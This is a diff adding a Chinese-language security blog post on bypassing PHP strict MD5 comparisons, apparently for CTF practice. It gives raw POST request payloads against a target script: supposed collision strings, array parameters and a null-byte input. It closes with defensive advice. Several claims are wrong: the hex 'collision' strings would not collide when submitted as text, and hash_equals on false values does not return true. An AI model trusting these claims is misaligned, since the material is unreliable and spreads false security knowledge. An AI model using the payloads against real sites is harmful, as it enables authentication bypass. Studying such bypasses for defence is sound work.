@@ -1,0 +1,132 @@
+<hr>
+<h2 id="title-PHP强比较漏洞date-2024-05-20categories-Web安全-PHP安全tags-PHP-比较漏洞"><a href="#title-PHP强比较漏洞date-2024-05-20categories-Web安全-PHP安全tags-PHP-比较漏洞" class="headerlink" title="title: PHP强比较漏洞date: 2024-05-20categories:  - Web安全  - PHP安全tags:  - PHP  - 比较漏洞"></a>title: PHP强比较漏洞<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - PHP安全<br>tags:<br>  - PHP<br>  - 比较漏洞</h2><h1 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h1><h2 id="1-MD5-碰撞（Collision-Attack）"><a href="#1-MD5-碰撞（Collision-Attack）" class="headerlink" title="1. MD5 碰撞（Collision Attack）"></a><strong>1. MD5 碰撞（Collision Attack）</strong></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。<br><strong>适用于</strong> <code>md5($a) === md5($b)</code>​ 且 <code>$a !== $b</code>​ 的情况。</p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><pre><code class="language-php">$a = &quot;240610708&quot;;  // md5: 0e462097431906509019562988736854
+$b = &quot;QNKCDZO&quot;;    // md5: 0e830400451993494058024219903391
+</code></pre>
+<p>虽然这两个字符串的 MD5 都以 <code>0e</code>​ 开头，但严格比较（<code>===</code>​）仍然会检查整个字符串，因此 <strong>需要找到真正的 MD5 碰撞</strong>。</p>
+<h3 id="已知-MD5-碰撞对"><a href="#已知-MD5-碰撞对" class="headerlink" title="已知 MD5 碰撞对"></a><strong>已知 MD5 碰撞对</strong></h3><pre><code class="language-php">$collision1 = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;;
+$collision2 = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;;
+</code></pre>
+<p>这两个字符串的 MD5 完全相同：</p>
+<pre><code class="language-php">md5($collision1) === md5($collision2); // true
+</code></pre>
+<p><strong>攻击方式</strong>：</p>
+<ul>
+<li><p>构造 <code>POST</code>​ 请求，提交这两个字符串：</p>
+<pre><code>POST /target.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+wqh=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&amp;dsy=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2
+</code></pre>
+</li>
+<li><p>这样 <code>md5($wqh) === md5($dsy)</code>​ 成立，且 <code>$wqh !== $dsy</code>​。</p>
+</li>
+</ul>
+<hr>
+<h2 id="2-数组绕过（Array-Bypass）"><a href="#2-数组绕过（Array-Bypass）" class="headerlink" title="2. 数组绕过（Array Bypass）"></a><strong>2. 数组绕过（Array Bypass）</strong></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>PHP 的 <code>md5()</code>​ 函数在接收数组时会返回 <code>false</code>​，因此如果 <code>$wqh</code>​ 和 <code>$dsy</code>​ 都是数组，则：</p>
+<pre><code class="language-php">md5($wqh) === md5($dsy); // false === false → true
+</code></pre>
+<p>但代码中通常会有 <code>$wqh !== $dsy</code>​ 检查，因此需要构造两个不同的数组。</p>
+<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h3><pre><code class="language-php">$wqh = [&quot;a&quot; =&gt; 1];
+$dsy = [&quot;b&quot; =&gt; 2];
+</code></pre>
+<ul>
+<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都返回 <code>false</code>​。</li>
+<li>​<code>$wqh !== $dsy</code>​ 成立（因为数组不同）。</li>
+</ul>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
+<pre><code>POST /target.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+wqh[]=1&amp;dsy[]=2
+</code></pre>
+<ul>
+<li>​<code>$_POST[&#39;wqh&#39;]</code>​ 和 <code>$_POST[&#39;dsy&#39;]</code>​ 是不同的数组。</li>
+<li>​<code>md5($_POST[&#39;wqh&#39;]) === md5($_POST[&#39;dsy&#39;])</code>​ 成立（都是 <code>false</code>​）。</li>
+<li>​<code>$_POST[&#39;wqh&#39;] !== $_POST[&#39;dsy&#39;]</code>​ 成立。</li>
+</ul>
+<hr>
+<h2 id="3-特殊字符串绕过（Magic-Hashes）"><a href="#3-特殊字符串绕过（Magic-Hashes）" class="headerlink" title="3. 特殊字符串绕过（Magic Hashes）"></a><strong>3. 特殊字符串绕过（Magic Hashes）</strong></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>某些字符串的 MD5 哈希值以 <code>0e</code>​ 开头（科学计数法），在 **松散比较（**​ <strong>​<code>==</code>​</strong> ​ <strong>）</strong>  时会被视为 <code>0</code>​，但在 **严格比较（**​ <strong>​<code>===</code>​</strong> ​ <strong>）</strong>  时仍然需要完全匹配。</p>
+<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><pre><code class="language-php">$a = &quot;s878926199a&quot;; // md5: 0e545993274517709034328855841020
+$b = &quot;s155964671a&quot;; // md5: 0e342768416822451524974117254469
+</code></pre>
+<p>虽然它们的 MD5 都以 <code>0e</code>​ 开头，但严格比较时不会匹配。</p>
+<h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a><strong>适用情况</strong></h3><p>如果代码错误地使用了 <code>==</code>​ 而不是 <code>===</code>​，可以使用这些字符串绕过：</p>
+<pre><code class="language-php">if ($a != $b &amp;&amp; md5($a) == md5($b)) { ... }
+</code></pre>
+<p>但在严格比较（<code>===</code>​）下无效。</p>
+<hr>
+<h2 id="4-NULL-字节注入（Null-Byte-Injection）"><a href="#4-NULL-字节注入（Null-Byte-Injection）" class="headerlink" title="4. NULL 字节注入（Null Byte Injection）"></a><strong>4. NULL 字节注入（Null Byte Injection）</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码在计算 MD5 之前对输入进行了字符串处理（如 <code>trim()</code>​、<code>substr()</code>​），可能会因 NULL 字节（<code>%00</code>​）导致哈希值相同。</p>
+<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h3><pre><code class="language-php">$a = &quot;abc\00&quot;;
+$b = &quot;abc&quot;;
+</code></pre>
+<p>如果代码在计算 MD5 之前去掉了 NULL 字节，则：</p>
+<pre><code class="language-php">md5(trim($a)) === md5($b); // true
+</code></pre>
+<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交：</p>
+<pre><code>POST /target.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+wqh=abc%00&amp;dsy=abc
+</code></pre>
+<p>如果服务器端代码对输入进行了 <code>trim()</code>​ 或类似处理，可能绕过。</p>
+<hr>
+<h2 id="5-利用-​hash-equals​​-的缺陷"><a href="#5-利用-​hash-equals​​-的缺陷" class="headerlink" title="5. 利用 ​hash_equals​​ 的缺陷"></a><strong>5. 利用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>的缺陷</strong></h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码使用 <code>hash_equals(md5($a), md5($b))</code>​，仍然可能被数组绕过：</p>
+<pre><code class="language-php">hash_equals(md5([]), md5([])); // true
+</code></pre>
+<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
+<pre><code>POST /target.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+wqh[]=1&amp;dsy[]=2
+</code></pre>
+<ul>
+<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都是 <code>false</code>​。</li>
+<li>​<code>hash_equals(false, false)</code>​ 返回 <code>true</code>​。</li>
+</ul>
+<hr>
+<h2 id="6-利用-​-​-​-的严格比较特性"><a href="#6-利用-​-​-​-的严格比较特性" class="headerlink" title="6. 利用  ​===​ ​ 的严格比较特性"></a><strong>6. 利用</strong>  <strong>​<code>===</code>​</strong> ​ <strong>的严格比较特性</strong></h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码逻辑有误，比如：</p>
+<pre><code class="language-php">if ($a !== $b &amp;&amp; md5($a) === md5($b)) { ... }
+</code></pre>
+<p>但 <code>md5($a)</code>​ 和 <code>md5($b)</code>​ 必须完全相同，因此 <strong>必须找到真正的 MD5 碰撞</strong>（如方法 1）。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>适用条件</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>MD5 碰撞</strong></td>
+<td>严格比较（<code>===</code>​）</td>
+<td>​<code>4dc968ff...</code>​vs<code>4dc968ff...</code>​</td>
+</tr>
+<tr>
+<td><strong>数组绕过</strong></td>
+<td>​<code>md5([]) === false</code>​</td>
+<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
+</tr>
+<tr>
+<td><strong>Magic Hashes</strong></td>
+<td>仅适用于<code>==</code>​</td>
+<td>​<code>s878926199a</code>​vs<code>s155964671a</code>​</td>
+</tr>
+<tr>
+<td><strong>NULL 字节注入</strong></td>
+<td>输入被<code>trim()</code>​处理</td>
+<td>​<code>abc%00</code>​vs<code>abc</code>​</td>
+</tr>
+<tr>
+<td>**<code>hash_equals</code>​绕过**</td>
+<td>使用<code>hash_equals</code>​</td>
+<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
+</tr>
+</tbody></table>
+<h3 id="最佳防御方式"><a href="#最佳防御方式" class="headerlink" title="最佳防御方式"></a><strong>最佳防御方式</strong></h3><ol>
+<li><strong>避免使用 MD5</strong>，改用 <code>SHA-256</code>​ 或 <code>bcrypt</code>​。</li>
+<li><strong>检查输入类型</strong>（<code>is_string()</code>​）。</li>
+<li><strong>禁止数组输入</strong>（<code>is_array()</code>​ 检查）。</li>
+<li><strong>使用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>但确保输入是字符串</strong>。</li>
+</ol>
